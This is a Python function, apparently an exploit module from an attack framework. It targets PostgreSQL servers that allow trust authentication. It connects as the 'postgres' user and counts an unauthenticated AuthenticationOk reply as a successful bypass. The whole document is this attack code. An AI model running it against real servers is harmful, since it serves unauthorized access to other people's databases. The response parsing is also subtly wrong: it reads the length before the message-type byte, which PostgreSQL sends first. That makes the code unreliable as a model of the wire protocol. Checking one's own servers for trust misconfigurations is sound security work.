def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    Exploits PostgreSQL authentication bypass via pg_hba.conf misconfiguration.
    Targets PostgreSQL servers (port 5432) where pg_hba.conf allows trust authentication
    for local connections or has overly permissive access rules. This works when the
    server is configured to accept connections without password authentication from
    specific IP ranges or users, allowing unauthorized access to databases.
    """
    try:
        import socket
        import struct
        import time

        # PostgreSQL protocol handshake - attempt to connect and identify auth method
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Send startup message to identify ourselves
        # Protocol version 3.0
        startup_msg = struct.pack("!I", 196608)  # Protocol version 3.0
        startup_msg += b"user\0postgres\0database\0postgres\0\0"  # User and database

        # Add length prefix
        total_len = len(startup_msg) + 4
        startup_msg = struct.pack("!I", total_len) + startup_msg

        sock.send(startup_msg)

        # Read response
        response = b""
        while True:
            try:
                data = sock.recv(1024)
                if not data:
                    break
                response += data
                if len(response) >= 4:
                    msg_len = struct.unpack("!I", response[:4])[0]
                    if len(response) >= msg_len:
                        break
            except socket.timeout:
                break

        if not response:
            return {"success": False, "data": "", "evidence": "No response from server"}

        # Check if we got an authentication request
        msg_type = response[4:5]
        if msg_type == b"R":  # Authentication request
            auth_type = struct.unpack("!I", response[5:9])[0]
            if auth_type == 0:  # AuthenticationOk
                return {
                    "success": True,
                    "data": "Authentication bypassed - trust authentication allowed",
                    "evidence": f"Server responded with auth type 0 (ok) on port {port}"
                }
            elif auth_type == 3:  # Cleartext password
                return {
                    "success": False,
                    "data": "",
                    "evidence": "Password authentication required"
                }
            elif auth_type == 5:  # MD5 password
                return {
                    "success": False,
                    "data": "",
                    "evidence": "MD5 password authentication required"
                }
            else:
                return {
                    "success": False,
                    "data": "",
                    "evidence": f"Unknown auth type: {auth_type}"
                }
        elif msg_type == b"E":  # Error response
            return {
                "success": False,
                "data": "",
                "evidence": "Connection rejected by server"
            }
        else:
            return {
                "success": False,
                "data": "",
                "evidence": f"Unexpected response type: {msg_type}"
            }

    except Exception as e:
        return {"success": False, "data": "", "evidence": str(e)}